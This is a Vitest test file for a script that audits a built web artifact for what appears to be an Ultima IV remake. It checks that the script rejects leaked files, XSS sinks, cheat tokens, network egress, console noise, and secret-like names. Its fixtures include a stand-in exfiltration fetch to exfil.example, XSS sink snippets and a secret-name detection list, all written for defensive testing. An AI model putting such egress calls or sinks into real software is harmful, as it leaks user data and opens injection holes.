import { spawnSync } from "node:child_process"
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { fileURLToPath } from "node:url"
import { afterEach, describe, expect, it } from "vitest"

const projectRoot = fileURLToPath(new URL("../../", import.meta.url))
const scriptPath = join(projectRoot, "scripts/audit-dist.mjs")

const createdDirs: string[] = []

afterEach(() => {
  while (createdDirs.length > 0) {
    const dir = createdDirs.pop()
    if (dir) rmSync(dir, { force: true, recursive: true })
  }
})

function makeCleanDist(): string {
  const dir = mkdtempSync(join(tmpdir(), "audit-dist-"))
  createdDirs.push(dir)
  writeFileSync(join(dir, "index.html"), "<!doctype html><html><body></body></html>")
  mkdirSync(join(dir, "assets"))
  // Allowed-behavior fixture: same-origin relative GET fetch plus
  // console.error/console.warn (the only console methods the audit permits).
  writeFileSync(
    join(dir, "assets", "index-abc123.js"),
    `fetch("./data.json").then((r) => r.ok).catch((e) => { console.error(e); console.warn("retry") })`
  )
  writeFileSync(join(dir, "assets", "index-abc123.css"), "body{}")
  return dir
}

function run(distDir: string) {
  return spawnSync("node", [scriptPath, `--dir=${distDir}`], { encoding: "utf8" })
}

describe("audit:dist", () => {
  it("passes for a clean Pages artifact with only web assets", () => {
    // Given: a dist directory containing only index.html + built assets.
    const dir = makeCleanDist()

    // When: the dist artifact audit runs.
    const result = run(dir)

    // Then: it succeeds.
    expect(result.status, result.stderr).toBe(0)
  })

  it("rejects original Ultima IV game data leaking into the artifact", () => {
    // Given: a dist directory that also (incorrectly) contains a copy of
    // the original game archive.
    const dir = makeCleanDist()
    writeFileSync(join(dir, "ULTIMA4.ZIP"), "fake game data")

    // When: the dist artifact audit runs.
    const result = run(dir)

    // Then: it fails and names the leaked path.
    expect(result.status).toBe(1)
    expect(result.stderr).toContain("original game data")
    expect(result.stderr).toContain("ULTIMA4.ZIP")
  })

  it("rejects development/tooling files leaking into the artifact", () => {
    // Given: a dist directory that (incorrectly) also contains a build-time
    // config file that should never be served statically.
    const dir = makeCleanDist()
    writeFileSync(join(dir, "vite.config.ts"), "export default {}")

    // When: the dist artifact audit runs.
    const result = run(dir)

    // Then: it fails and names the leaked path.
    expect(result.status).toBe(1)
    expect(result.stderr).toContain("vite.config.ts")
  })

  it("fails clearly when the artifact has no index.html at its root", () => {
    // Given: an empty directory (e.g. the site was never built).
    const dir = mkdtempSync(join(tmpdir(), "audit-dist-empty-"))
    createdDirs.push(dir)

    // When: the dist artifact audit runs.
    const result = run(dir)

    // Then: it fails, pointing at the missing artifact root file.
    expect(result.status).toBe(1)
    expect(result.stderr).toContain("index.html")
  })

  it("rejects XSS sinks in shipped JavaScript", () => {
    // Given: one dist artifact per known XSS sink primitive.
    const probes = [
      { label: "innerHTML", snippet: `el.innerHTML = userText` },
      { label: "outerHTML", snippet: `el.outerHTML = userText` },
      { label: "insertAdjacentHTML", snippet: `el.insertAdjacentHTML("beforeend", userText)` },
      { label: "document.write", snippet: `document.write(userText)` },
      { label: "dangerouslySetInnerHTML", snippet: `h("div", { dangerouslySetInnerHTML: userText })` },
      { label: "eval", snippet: `eval(code)` },
      { label: "new Function", snippet: `new Function("a", "return a")` }
    ]

    for (const [index, probe] of probes.entries()) {
      // When: the dist artifact audit runs over a bundle containing the sink.
      const dir = makeCleanDist()
      writeFileSync(join(dir, "assets", `probe-${index}.js`), probe.snippet)
      const result = run(dir)

      // Then: it fails and names the sink.
      expect(result.status, `sink ${probe.label}: ${result.stderr}`).toBe(1)
      expect(result.stderr, `sink ${probe.label}`).toContain(probe.label)
    }
  })

  it("rejects test-hook markers that are not explicitly allowlisted", () => {
    // Given: dist bundles using hook markers no allowlist entry covers.
    const probes = [
      { label: "window.ultima", snippet: `window.ultima = { debug: true }` },
      { label: "__test__", snippet: `globalThis.__test__ = { ready: true }` },
      { label: "data-bridge-ready", snippet: `node.setAttribute("data-bridge-ready-e2e", "1")` }
    ]

    for (const [index, probe] of probes.entries()) {
      // When: the dist artifact audit runs.
      const dir = makeCleanDist()
      writeFileSync(join(dir, "assets", `hook-${index}.js`), probe.snippet)
      const result = run(dir)

      // Then: it fails and names the marker.
      expect(result.status, `marker ${probe.label}: ${result.stderr}`).toBe(1)
      expect(result.stderr, `marker ${probe.label}`).toContain(probe.label)
    }
  })

  it("passes for the explicitly allowlisted QA bridge hooks", () => {
    // Given: a dist bundle using only the deliberate Todo-16 QA/e2e hooks
    // (src/main.ts's window.ultimaBridge/Input/Audio + data-bridge-ready).
    const dir = makeCleanDist()
    writeFileSync(
      join(dir, "assets", "hooks.js"),
      `window.ultimaBridge = bridge; window.ultimaInput = queue; window.ultimaAudio = audio; document.body.setAttribute("data-bridge-ready", "true")`
    )

    // When: the dist artifact audit runs.
    const result = run(dir)

    // Then: it succeeds -- the allowlist covers exactly these hooks.
    expect(result.status, result.stderr).toBe(0)
  })

  it("rejects cheat tokens in shipped JavaScript", () => {
    // Given: dist bundles exposing cheat/debug affordances.
    const probes = [
      { label: "godmode", snippet: `if (player.godmode) { damage = 0 }` },
      { label: "teleport", snippet: `function teleport(x, y) { move(x, y) }` },
      { label: "noclip", snippet: `flags.noclip = true` },
      { label: "giveAll", snippet: `giveAll(items)` },
      { label: "setGold", snippet: `setGold(9999)` },
      { label: "debugBridge", snippet: `debugBridge.open()` }
    ]

    for (const [index, probe] of probes.entries()) {
      // When: the dist artifact audit runs.
      const dir = makeCleanDist()
      writeFileSync(join(dir, "assets", `cheat-${index}.js`), probe.snippet)
      const result = run(dir)

      // Then: it fails and names the token.
      expect(result.status, `cheat ${probe.label}: ${result.stderr}`).toBe(1)
      expect(result.stderr, `cheat ${probe.label}`).toContain(probe.label)
    }
  })

  it("rejects network egress beyond same-origin GET", () => {
    // Given: dist bundles exfiltrating or opening out-of-origin channels.
    const probes = [
      { label: "POST", snippet: `fetch(url, { method: "POST" })` },
      { label: "PUT", snippet: `fetch(url, { method: "PUT" })` },
      { label: "sendBeacon", snippet: `navigator.sendBeacon("/ping", payload)` },
      { label: "WebSocket", snippet: `new WebSocket("wss://relay.example/socket")` },
      { label: "EventSource", snippet: `new EventSource("/events")` },
      { label: "exfil.example", snippet: `fetch("https://exfil.example/collect")` }
    ]

    for (const [index, probe] of probes.entries()) {
      // When: the dist artifact audit runs.
      const dir = makeCleanDist()
      writeFileSync(join(dir, "assets", `egress-${index}.js`), probe.snippet)
      const result = run(dir)

      // Then: it fails and names the egress.
      expect(result.status, `egress ${probe.label}: ${result.stderr}`).toBe(1)
      expect(result.stderr, `egress ${probe.label}`).toContain(probe.label)
    }
  })

  it("rejects noisy console methods while allowing error/warn", () => {
    // Given: dist bundles calling each banned console method. (The clean
    // fixture already proves console.error/console.warn pass.)
    for (const method of ["log", "debug", "info", "table"]) {
      // When: the dist artifact audit runs.
      const dir = makeCleanDist()
      writeFileSync(join(dir, "assets", `console-${method}.js`), `console.${method}("trace")`)
      const result = run(dir)

      // Then: it fails and names the method.
      expect(result.status, `console.${method}: ${result.stderr}`).toBe(1)
      expect(result.stderr, `console.${method}`).toContain(`console.${method}`)
    }
  })

  it("rejects storage access and secret-like names", () => {
    // Given: dist bundles touching Web Storage or naming secrets.
    const probes = [
      { label: "localStorage", snippet: `localStorage.getItem("save")` },
      { label: "sessionStorage", snippet: `sessionStorage.setItem("x", "1")` },
      { label: "apiKey", snippet: `const apiKey = load()` },
      { label: "privateKey", snippet: `const privateKey = load()` },
      { label: "passwd", snippet: `check(passwd)` },
      { label: "bearer", snippet: `const bearer = getToken()` }
    ]

    for (const [index, probe] of probes.entries()) {
      // When: the dist artifact audit runs.
      const dir = makeCleanDist()
      writeFileSync(join(dir, "assets", `secret-${index}.js`), probe.snippet)
      const result = run(dir)

      // Then: it fails and names the token.
      expect(result.status, `secret ${probe.label}: ${result.stderr}`).toBe(1)
      expect(result.stderr, `secret ${probe.label}`).toContain(probe.label)
    }
  })
})
